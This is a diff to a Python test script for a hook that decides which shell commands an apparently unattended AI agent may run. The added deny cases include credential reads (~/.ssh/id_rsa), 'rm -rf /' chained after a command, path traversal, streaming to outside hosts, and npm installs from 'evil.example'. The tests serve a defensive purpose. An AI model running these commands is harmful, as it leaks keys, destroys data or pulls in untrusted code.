@@ -13,7 +13,9 @@ import sys
 import time
 
 ROOT = "/Users/triton/PROTEUS/"
-HOOK = ROOT + ".claude/hooks/unattended-decide.py"
+# The hook beside this script, so a worktree tests its own copy. The marker stays in ROOT because
+# that is where the hook reads it.
+HOOK = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), ".claude/hooks/unattended-decide.py")
 MARKER = ROOT + "state/unattended-session.json"
 SID = "test-session-0001"
 
@@ -81,6 +83,58 @@ CASES = [
     ("Bash", {"command": "grep -c 'a;b' " + ROOT + "x.md"}, "allow"),
     ("Bash", {"command": "grep -c 'cost $5 & up' " + ROOT + "x.md"}, "allow"),
     ("Bash", {"command": "git -C " + ROOT + " commit -m \"fix: for and while, 2>1; done\""}, "allow"),
+    # ffmpeg/ffprobe, cp, npm: added 2026-10-07. The first two are the 6 Oct nightly's denials, verbatim.
+    ("Bash", {"command": "ffmpeg -hide_banner -loglevel error -y -ss 5 -i /Users/triton/PROTEUS/sandbox/p0065/01-flat-vector.mp4 -frames:v 1 -vf scale=640:-1 /Users/triton/PROTEUS/experiments/2026-10-07-P-0065/frame-5s.png"}, "allow"),
+    ("Bash", {"command": "cp /Users/triton/PROTEUS/sandbox/p0065/cdp_render.py /Users/triton/PROTEUS/sandbox/p0065/inspect_mp4.py /Users/triton/PROTEUS/experiments/2026-10-07-P-0065/"}, "allow"),
+    ("Bash", {"command": "ffprobe -v error -show_entries format=duration -of csv=p=0 " + ROOT + "sandbox/p0065/a.mp4"}, "allow"),
+    ("Bash", {"command": "ffmpeg -r 30000/1001 -i " + ROOT + "sandbox/f/%05d.png -c:v libx264 " + ROOT + "sandbox/f/out.mp4"}, "allow"),
+    ("Bash", {"command": "ffmpeg -f lavfi -i anullsrc=r=48000:cl=stereo -t 1 " + ROOT + "sandbox/x.wav"}, "allow"),
+    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -vf subtitles=" + ROOT + "sandbox/a.srt " + ROOT + "sandbox/b.mp4"}, "allow"),
+    ("Bash", {"command": "ffmpeg -y -i pipe:0 " + ROOT + "sandbox/x.mp4"}, "allow"),
+    ("Bash", {"command": "ffprobe -v error -show_streams " + ROOT + "sandbox/a.mp4 | grep codec_name"}, "allow"),
+    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 /Users/triton/Desktop/out.mp4"}, "deny"),
+    ("Bash", {"command": "ffmpeg -i /etc/hosts " + ROOT + "sandbox/x.txt"}, "deny"),
+    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 " + ROOT + "../evil.mp4"}, "deny"),
+    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -vf movie=/Users/triton/.ssh/id_rsa " + ROOT + "sandbox/b.mp4"}, "deny"),
+    ("Bash", {"command": "ffmpeg -i https://example.com/a.mp4 " + ROOT + "sandbox/a.mp4"}, "deny"),
+    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -f flv rtmp://example.com/live"}, "deny"),
+    ("Bash", {"command": "ffmpeg -i concat:" + ROOT + "a.mp4|" + ROOT + "b.mp4 " + ROOT + "c.mp4"}, "deny"),
+    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 sandbox/out.mp4"}, "deny"),
+    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 ~/out.mp4"}, "deny"),
+    ("Bash", {"command": "ffmpeg -progress /tmp/p.txt -i " + ROOT + "sandbox/a.mp4 " + ROOT + "sandbox/b.mp4"}, "deny"),
+    ("Bash", {"command": "ffmpeg -dump_attachment:t '' -i " + ROOT + "sandbox/a.mkv"}, "deny"),
+    ("Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 " + ROOT + "sandbox/b.mp4; rm -rf /"}, "deny"),
+    ("Bash", {"command": "cp -R " + ROOT + "sandbox/p0065 " + ROOT + "experiments/x/"}, "allow"),
+    ("Bash", {"command": "cp " + ROOT + "field-notes/2026-W41.md /Users/triton/OBSIDIAN/TRITON-CORE/Proteus/field-notes/"}, "allow"),
+    ("Bash", {"command": "cp " + ROOT + "sandbox/x /Users/triton/Desktop/"}, "deny"),
+    ("Bash", {"command": "cp /Users/triton/.ssh/id_rsa " + ROOT + "sandbox/"}, "deny"),
+    ("Bash", {"command": "cp -i " + ROOT + "sandbox/x " + ROOT + "sandbox/y"}, "deny"),
+    ("Bash", {"command": "cp " + ROOT + "sandbox/x " + ROOT + "../OBSIDIAN/XXIX/x"}, "deny"),
+    ("Bash", {"command": "cp " + ROOT + "sandbox/x"}, "deny"),
+    ("Bash", {"command": "cp sandbox/x " + ROOT + "sandbox/y"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/p0067 ci --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "allow"),
+    ("Bash", {"command": "npm --prefix=" + ROOT + "sandbox/p0065 install --ignore-scripts --no-audit --no-fund --cache=" + ROOT + "sandbox/.npm-cache puppeteer-core@23.0.0 @scope/pkg ws@^8"}, "allow"),
+    ("Bash", {"command": "npm install"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --cache " + ROOT + "sandbox/.npm-cache"}, "deny"),                    # scripts on
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts"}, "deny"),                                         # ~/.npm cache
+    ("Bash", {"command": "npm --prefix " + ROOT + "grinder install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/../grinder install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install -g --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache left-pad"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts --registry=https://evil.example --cache " + ROOT + "sandbox/.npm-cache x"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache github:user/repo"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache https://x.example/p.tgz"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x install --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache file:../y"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x ci --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache left-pad"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x run build"}, "deny"),
+    ("Bash", {"command": "npm --prefix " + ROOT + "sandbox/x exec --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache x"}, "deny"),
+    ("Bash", {"command": "npx -y some-tool"}, "deny"),
+]
+
+# The cwd decides where ffmpeg's bare names land, so it must be the folder (2026-10-07).
+CWD_CASES = [
+    ({"cwd": "/Users/triton/PROTEUS"}, "Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -report " + ROOT + "sandbox/b.mp4"}, "allow"),
+    ({"cwd": "/Users/triton"}, "Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 -report " + ROOT + "sandbox/b.mp4"}, "deny"),
 ]
 
 
@@ -133,6 +187,12 @@ FANOUT_CASES = [
     (CHILD, "Bash", {"command": "touch " + ROOT + "state/agents/x"}, "allow"),
     (CHILD, "Bash", {"command": "touch " + ROOT + "HALT"}, "deny"),
     (CHILD, "Bash", {"command": "echo one; echo two"}, "deny"),                                      # parent rules still apply
+    # child cp/ffmpeg/npm (2026-10-07): copy in from anywhere in the write roots, write only to scratch
+    (CHILD, "Bash", {"command": "cp " + ROOT + "grinder/LEDGER.csv " + ROOT + "sandbox/probe/"}, "allow"),
+    (CHILD, "Bash", {"command": "cp " + ROOT + "sandbox/probe/x.csv " + ROOT + "grinder/LEDGER.csv"}, "deny"),
+    (CHILD, "Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 " + ROOT + "state/agents/b.png"}, "allow"),
+    (CHILD, "Bash", {"command": "ffmpeg -i " + ROOT + "sandbox/a.mp4 " + ROOT + "experiments/b.png"}, "deny"),
+    (CHILD, "Bash", {"command": "npm --prefix " + ROOT + "sandbox/x ci --ignore-scripts --cache " + ROOT + "sandbox/.npm-cache"}, "allow"),
     # child reads and browser: unchanged from the parent
     (CHILD, "Read", {"file_path": ROOT + "CHARTER.md"}, "allow"),
     (CHILD, "Read", {"file_path": "/etc/hosts"}, "deny"),
@@ -197,6 +257,11 @@ def main():
             ok = got == want
             fails += 0 if ok else 1
             print(("PASS" if ok else "FAIL"), tool, json.dumps(ti)[:70], "want", want, "got", got)
+        for who, tool, ti, want in CWD_CASES:
+            got = run(tool, ti, who=who)
+            ok = got == want
+            fails += 0 if ok else 1
+            print(("PASS" if ok else "FAIL"), "cwd", who["cwd"], tool, json.dumps(ti)[:50], "want", want, "got", got)
         # fan-out: rebind the marker to the fresh id, switch the feature on for the subprocess only
         with open(MARKER, "w") as fh:
             json.dump({"session_id": FANOUT_SID, "task": "test", "bound_at": time.time()}, fh)
@@ -232,7 +297,7 @@ def main():
         else:
             with open(MARKER, "w") as fh:
                 fh.write(saved)
-    print("%d cases, %d failed" % (len(CASES) + len(FANOUT_CASES) + 1 + len(HALT_CASES), fails))
+    print("%d cases, %d failed" % (len(CASES) + len(CWD_CASES) + len(FANOUT_CASES) + 1 + len(HALT_CASES), fails))
     sys.exit(1 if fails else 0)
 
 
